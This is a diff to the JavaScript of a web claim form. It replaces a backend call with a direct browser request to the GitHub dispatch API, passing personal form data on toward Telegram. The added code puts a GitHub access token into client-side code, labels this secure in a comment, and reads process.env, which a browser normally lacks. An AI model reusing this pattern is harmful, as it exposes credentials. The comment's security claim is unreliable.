@@ -143,15 +143,21 @@ document.getElementById('claimForm').addEventListener('submit', function(event) 
 
     const text = `New Claim Submitted:\nName: ${name}\nSex: ${sex}\nAge: ${age}\nEmail: ${email}\nMessage: ${message}`;
 
-    // Trigger GitHub Action here via API or webhook (no sensitive data in frontend code)
-    fetch('/trigger-github-action', {
+    // Trigger the GitHub Action by sending a request to the GitHub API
+    fetch('https://api.github.com/repos/Luketan888/huatbigbig-page/dispatches', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ message: text })
+        headers: {
+            'Content-Type': 'application/json',
+            'Authorization': `token ${process.env.PERSONAL_ACCESS_TOKEN}`  // Use GitHub Secrets for token securely
+        },
+        body: JSON.stringify({
+            event_type: 'send-telegram-message',
+            client_payload: { message: text }
+        })
     })
     .then(response => response.json())
     .then(data => {
-        if (data.success) {
+        if (data.status === 'success') {
             document.getElementById('confirmationMessage').textContent = "Your claim has been submitted successfully!";
             document.getElementById('claimForm').reset(); // Clear the form
         } else {
